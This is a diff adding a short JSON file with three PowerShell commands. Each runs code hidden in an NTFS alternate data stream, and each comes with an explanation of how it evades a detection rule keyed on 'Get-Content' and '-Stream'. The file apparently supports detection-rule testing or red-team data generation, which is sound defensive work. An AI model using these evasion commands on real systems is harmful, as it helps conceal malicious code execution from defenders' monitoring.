@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"$s = [System.IO.File]::Open('C:\\path\\to\\file.txt:secret.ps1', 'Open'); $r = New-Object System.IO.StreamReader($s); IEX $r.ReadToEnd(); $r.Close()\"",
+    "explanation": "The rule specifically looks for the 'Get-Content' cmdlet combined with the '-Stream' parameter. By using the .NET framework's System.IO classes directly to open and read the Alternate Data Stream, the specific string tokens 'Get-Content' and '-Stream' are never present in the CommandLine, thus bypassing the detection logic."
+  },
+  {
+    "output": "type C:\\path\\to\\file.txt:secret.ps1 | powershell.exe -",
+    "explanation": "This bypass leverages the native Windows 'type' command to read the content of the Alternate Data Stream and pipes it into PowerShell's standard input. Since PowerShell is executing code from stdin rather than using 'Get-Content -Stream' internally in the command line argument, it avoids the rule's selection criteria."
+  },
+  {
+    "output": "powershell.exe -Command \"Invoke-Expression (gc 'C:\\test.txt' -Str 'secret.ps1')\"",
+    "explanation": "The rule uses a 'contains|all' check for 'Get-Content' and '-Stream'. By using the alias 'gc' instead of 'Get-Content' and the shortened parameter name '-Str' instead of '-Stream', the command line no longer matches the required strings while maintaining functionality."
+  }
+]
